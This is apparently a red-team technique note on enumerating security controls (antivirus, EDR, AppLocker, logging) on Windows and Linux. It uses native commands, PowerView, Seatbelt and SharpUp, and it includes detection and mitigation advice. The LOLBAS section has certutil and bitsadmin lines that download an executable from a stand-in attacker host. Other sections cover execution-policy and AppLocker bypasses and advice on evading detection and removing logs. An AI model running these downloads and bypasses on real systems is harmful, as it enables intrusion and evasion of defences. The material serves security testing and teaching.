---
tags:
  - "#type/technique"
  - "#tactic/TA0007"
  - "#technique/T1082"
  - "#stage/reconnaissance"
  - "#os/windows"
  - "#tool/seatbelt"
  - "#tool/sharpup"
  - "#tool/lolbas"
  - "#tool/powerview"
  - "#stage/initial-access"
aliases:
  - Security Controls Enumeration
  - Endpoint Protection Mapping
  - Defensive Measures Discovery
  - Living Off The Land Enumeration
---
## Technique
___
Security Controls Enumeration involves identifying and analyzing security products, configurations, and defensive measures on a target system. This intelligence gathering is crucial for both attackers (to evade detection) and defenders (to validate security posture).

Effective enumeration reveals:
- Security products installed (antivirus, EDR, etc.)
- Security configurations (AppLocker, AMSI, PowerShell restrictions)
- Audit policies and logging configurations
- Firewall rules and network security settings
- Patch levels and vulnerable components

A key approach is "Living Off The Land" (LOL) - using built-in system utilities and administration tools rather than custom tools to avoid detection. These native binaries and scripts are legitimate and trusted by the operating system, making their activities less likely to trigger alerts.

## Prerequisites
___
**Access Level:** At minimum, standard user access to the target system. Higher privileges will reveal more comprehensive information.

**System State:** The target system should be in a normal operating state with standard system utilities available.

**Information Required:**
- Basic understanding of the target operating system (Windows/Linux)
- Knowledge of common system administration commands
- Awareness of security product indicators

## Execution
___
### Living Off The Land Techniques (Windows)

#### OS Context & Basic Information

```cmd
# Get hostname
hostnamei

# Get OS version
wmic os get Caption,Version,BuildNumber,OSArchitecture
[System.Environment]::OSVersion.Version

# Get patches and hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Get network configuration
ipconfig /all

# Get environment variables
set

# Display domain information
echo %USERDOMAIN%
echo %logonserver%

# Comprehensive system information
systeminfo
```

#### Security Product Enumeration

```cmd
# Check Windows Defender status
sc query windefend
Get-MpComputerStatus

# Check firewall status
netsh advfirewall show allprofiles

# List installed security updates
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /i "security KB"

# Check antivirus products (WMI query)
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe

# Check running security services
sc query type= service | findstr /i "defender security antivirus firewall protection"

# Check scheduled tasks related to security
schtasks /query /fo LIST /v | findstr /i "defender security antivirus firewall protection"
```

#### PowerShell Security Settings

```powershell
# Check PowerShell version
$PSVersionTable

# Check PowerShell execution policy
Get-ExecutionPolicy -List

# Check PowerShell language mode (restrictions)
$ExecutionContext.SessionState.LanguageMode

# Check PowerShell modules available
Get-Module -ListAvailable

# Check PowerShell script block logging
Reg Query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"

# Check PowerShell transcription
Reg Query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"

# Check AMSI (Anti-Malware Scan Interface) status
Reg Query "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v "Enabled"
```

### PowerView Remote Enumeration Techniques

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) 

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# If running as a different user (for authentication to remote systems)
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
```

#### Remote Process Enumeration

```powershell
# Enumerate processes on a remote system using PowerView
Get-NetProcess -ComputerName "target-computer"

# With alternate credentials
Get-NetProcess -ComputerName "target-computer" -Credential $Cred

# Filter for security product processes
Get-NetProcess -ComputerName "target-computer" | 
    Where-Object { $_.ProcessName -match "defender|crowdstrike|sentinel|cylance|carbonblack|mcafee|symantec|kaspersky|sophos" }

# Using WMI for process enumeration with command line details
Get-WmiObject -Class Win32_Process -ComputerName "target-computer" | 
    Where-Object { $_.Name -match "defender|crowdstrike|sentinel|cylance" } | 
    Select-Object Name, ProcessId, CommandLine

# Enumerate processes across multiple computers
$computers = Get-DomainComputer | Select-Object -ExpandProperty dnshostname
foreach ($computer in $computers) {
    Write-Host "===== $computer ====="
    try {
        Get-NetProcess -ComputerName $computer -ErrorAction Stop | 
            Where-Object { $_.ProcessName -match "defender|security|protect" }
    } catch {
        Write-Host "Unable to query $computer"
    }
}
```

#### Remote Service Enumeration

```powershell
# Enumerate services on a remote system using PowerView
Get-NetService -ComputerName "target-computer"

# With alternate credentials
Get-NetService -ComputerName "target-computer" -Credential $Cred

# Filter for security services
Get-NetService -ComputerName "target-computer" | 
    Where-Object { $_.ServiceName -match "defender|security|protect|antivirus|firewall" }

# Check for EDR services
Get-NetService -ComputerName "target-computer" | 
    Where-Object { $_.ServiceName -match "cb|crowd|sentinel|defender|cylance" } | 
    Select-Object ServiceName, Path, StartMode, StartName

# Using WMI for service enumeration
Get-WmiObject -Class Win32_Service -ComputerName "target-computer" | 
    Where-Object { $_.DisplayName -match "defend|secur|protect|antivirus|firewall|detect" } | 
    Select-Object Name, DisplayName, State, PathName, StartName

# Check for services with specific account context
Get-WmiObject -Class Win32_Service -ComputerName "target-computer" | 
    Where-Object { $_.StartName -match "LocalSystem" } | 
    Select-Object Name, DisplayName, State, PathName, StartName
```

#### Remote Registry Enumeration

```powershell
# Check remote Windows Defender status
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -ErrorAction SilentlyContinue
}

# Check remote PowerShell logging configuration
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
}

# Check AppLocker configuration remotely
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-ChildItem -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -ErrorAction SilentlyContinue
}

# Using WMI for registry access
Invoke-WmiMethod -Class StdRegProv -Name GetDWORD `
    -ArgumentList @([UInt32]2147483650,"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection","DisableRealtimeMonitoring") `
    -ComputerName "target-computer"
```

#### Remote Security Event Log Analysis

```powershell
# Check security event log size
Get-WmiObject -Class Win32_NTEventLogFile -ComputerName "target-computer" | 
    Where-Object { $_.LogFileName -eq 'Security' } | 
    Select-Object LogFileName, FileSize, MaxFileSize

# Extract failed login attempts remotely
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-EventLog -LogName Security -InstanceId 4625 -Newest 10 | 
    Select-Object TimeGenerated, EntryType, Message
}

# Check for PowerShell script block logging events
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 5
}
```

#### Remote File System Analysis

```powershell
# Check for security product installations
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-ChildItem 'C:\Program Files' -Include "Defender", "CrowdStrike", "Carbon Black", "Cylance", "SentinelOne" -Directory -ErrorAction SilentlyContinue
    Get-ChildItem 'C:\Program Files (x86)' -Include "Defender", "CrowdStrike", "Carbon Black", "Cylance", "SentinelOne" -Directory -ErrorAction SilentlyContinue
}

# Check for LAPS DLL (indicates LAPS is installed)
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Test-Path 'C:\Program Files\LAPS\CSE\Admpwd.dll'
}

# Find security-related logs
Invoke-Command -ComputerName "target-computer" -ScriptBlock {
    Get-ChildItem 'C:\Windows\System32\winevt\Logs' -Include "*security*", "*defender*", "*firewall*", "*powershell*" -File
}
```

#### Domain Policy Enumeration with PowerView

```powershell
# Get domain password policy
Get-DomainPolicy

# Get domain audit policy
Get-DomainPolicy -PolicyType AuditPolicy

# Get specific policy settings
$domainPolicy = Get-DomainPolicy
$domainPolicy.SystemAccess
$domainPolicy.RegistryValues

# Find users with interesting privileges
Get-DomainUser -AdminCount | Select-Object SamAccountName, DistinguishedName

# Find domain controllers and their security settings
Get-DomainController | Select-Object Name, OSVersion, IPAddress
```

#### Domain Computer Security Assessment

```powershell
# Find computers with constrained delegation (potential lateral movement targets)
Get-DomainComputer -TrustedToAuth | Select-Object -Property DnsHostName, msds-allowedtodelegateto

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object -Property DnsHostName

# Find all domain computers with operating system information
Get-DomainComputer -Properties DnsHostName, OperatingSystem, OperatingSystemVersion, LastLogonDate |
    Sort-Object -Property OperatingSystem | Format-Table

# Find servers with specific roles
Get-DomainComputer -Properties DnsHostName, msDS-RevealedUsers, servicePrincipalName |
    Where-Object {$_.servicePrincipalName -match "SQL|MSSQL"}
```

### Application Control & AppLocker

```powershell
# Check AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check Software Restriction Policies
Reg Query "HKLM\Software\Policies\Microsoft\Windows\Safer"

# Check Device Guard / Windows Defender Application Control settings
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

### LAPS (Local Administrator Password Solution)

```powershell
# Check if LAPS is installed
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'

# Check LAPS GPO settings (requires admin rights)
Reg Query "HKLM\Software\Policies\Microsoft Services\AdmPwd"
```

### Windows Event Logging

```powershell
# Check audit policy settings
auditpol /get /category:*

# Check Windows Event Forwarding settings
wevtutil gl forwardedEvents

# Check log sizes and retention policy
wevtutil gl Security
wevtutil gl System
wevtutil gl Application
```

### Tool-Based Enumeration Techniques

#### Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs comprehensive security checks from both offensive and defensive perspectives.

```powershell
# Run all checks
Seatbelt.exe -group=all -outputfile="C:\Temp\seatbelt_all.txt"

# Run system-related checks
Seatbelt.exe -group=system -outputfile="C:\Temp\seatbelt_system.txt"

# Run security-specific checks
Seatbelt.exe -group=security -outputfile="C:\Temp\seatbelt_security.txt"

# Run antivirus checks only
Seatbelt.exe AntiVirus

# Check AppLocker configuration
Seatbelt.exe AppLocker
```

#### SharpUp

[SharpUp](https://github.com/GhostPack/SharpUp) helps identify common Windows privilege escalation vectors and security misconfigurations.

```powershell
# Run all checks
SharpUp.exe

# Run specific audits
SharpUp.exe audit

# Check for specific issues
SharpUp.exe audit AlwaysInstallElevated
SharpUp.exe audit ModifiableServices
```

### LOLBAS - Living Off The Land Binaries and Scripts

When traditional enumeration methods are blocked, [LOLBAS](https://lolbas-project.github.io/) (Living Off The Land Binaries and Scripts) can be used. These are Microsoft-signed binaries that can be used for alternative purposes.

```powershell
# Use certutil to download files
certutil.exe -urlcache -split -f "http://attacker.com/file.exe" file.exe

# Use bitsadmin to download files
bitsadmin /transfer myJob /download /priority high http://attacker.com/file.exe c:\data\file.exe

# Use msbuild to execute code
msbuild.exe project.xml

# Use rundll32 to execute code
rundll32.exe advpack.dll,LaunchINFSection file.inf,DefaultInstall_SingleUser,1,
```

### Linux Security Control Enumeration

```bash
# Check for antivirus installations
ps aux | grep -i "virus\|protect\|defend\|security\|clamav\|mcafee\|symantec"

# Check loaded security modules
lsmod | grep -i "security\|selinux\|apparmor\|audit"

# Check installed security packages
dpkg -l | grep -i "security\|firewall\|antivirus\|protect\|defend"

# Check SELinux status
getenforce
sestatus

# Check AppArmor status
aa-status

# Check firewall rules
iptables -L
ufw status

# Check audit rules
auditctl -l

# Check running security services
systemctl list-units --type=service | grep -i "security\|firewall\|antivirus\|protect\|defend"
```

## Bypassing Security Controls

### PowerShell Execution Policy Bypass

```powershell
# Bypass execution policy for current process
Set-ExecutionPolicy Bypass -Scope Process

# Inline bypass with command
powershell -ExecutionPolicy Bypass -File script.ps1

# Use PowerShell v2 (if available) which might have fewer protections
powershell.exe -version 2
```

### AppLocker Bypass Using LOLBAS

Using trusted utilities that exist in allowed paths (C:\Windows and C:\Program Files):

```powershell
# Example using MSBuild to execute C# code
# First create an XML file with C# code (example: project.xml)

# Then execute:
msbuild.exe project.xml
```

### Alternative PowerShell Paths

Many organizations block PowerShell.exe but forget about alternative PowerShell executables:

```cmd
# PowerShell in SysWOW64
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

# PowerShell ISE
PowerShell_ISE.exe

# PowerShell from .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U script.ps1
```

## Common Security Controls to Identify

### Endpoint Protection
- **Antivirus/Antimalware**: Windows Defender, Symantec, McAfee, etc.
- **EDR Solutions**: CrowdStrike, Carbon Black, SentinelOne, etc.
- **Host-based Firewalls**: Windows Firewall, iptables
- **Host Intrusion Prevention Systems (HIPS)**

### Application Controls
- **Application Whitelisting**: AppLocker, Software Restriction Policies
- **PowerShell Security**: ExecutionPolicy, AMSI, ScriptBlock Logging, Module Logging, Constrained Language Mode
- **.NET CLR Versions** (relevant for post-exploitation frameworks)

### System Hardening
- **User Account Control (UAC)** settings
- **Credential Guard/Device Guard** status
- **LAPS** (Local Administrator Password Solution) implementation
- **BitLocker** or other disk encryption
- **Secure Boot** status

### Logging & Monitoring
- **Windows Event Logging** configurations
- **Sysmon** deployment and configuration
- **Audit Policies** (success/failure for various events)
- **ETW** (Event Tracing for Windows) configurations

## Detection & Mitigation
___

### Detection

- Monitor for suspicious querying of registry keys related to security products
- Look for unusual WMI or PowerShell queries that enumerate security configurations
- Watch for enumeration of Windows services, especially security-related ones
- Monitor for tools like Seatbelt, SharpUp, and other security assessment utilities
- Alert on extensive command-line activity that queries system configurations
- Monitor for remote process enumeration through WMI/PowerShell remoting
- Watch for multiple registry queries from remote hosts
- Alert on unusual PowerView or WMI activities across multiple systems

### Mitigation

- Apply the principle of least privilege to limit what users can discover
- Configure proper AppLocker or Software Restriction Policies to block unauthorized tools
- Implement command line auditing to detect suspicious enumeration activities
- Regularly update and patch security software to protect against known evasion techniques
- Consider using deception technologies to detect enumeration attempts
- Enable PowerShell Script Block Logging and Module Logging
- Implement Just-In-Time administration for privileged access
- Use WDAC (Windows Defender Application Control) to limit which binaries can execute
- Restrict WMI access and PowerShell remoting to necessary users only
- Implement network segmentation to limit lateral movement
- Deploy honey accounts and systems to detect enumeration attempts

## OPSEC Considerations
___

When conducting security controls enumeration:

- Built-in commands (like `net`, `sc`, `wmic`) generate less noise than custom tools
- Some commands might be blocked or monitored (use alternatives like `net1` instead of `net`)
- Consider the timing of your enumeration activities to blend with normal user activity
- Run only necessary commands; exhaustive enumeration increases detection risk
- Be aware of command logging and audit trails
- PowerShell commands are likely monitored; consider using cmd.exe alternatives where possible
- For remote enumeration, limit the number of systems queried in a short timeframe
- WMI queries may be monitored; use targeted queries rather than broad sweeps
- Remove any logs or output files created during enumeration
- Use native WMI methods rather than PowerView when possible for a lower detection profile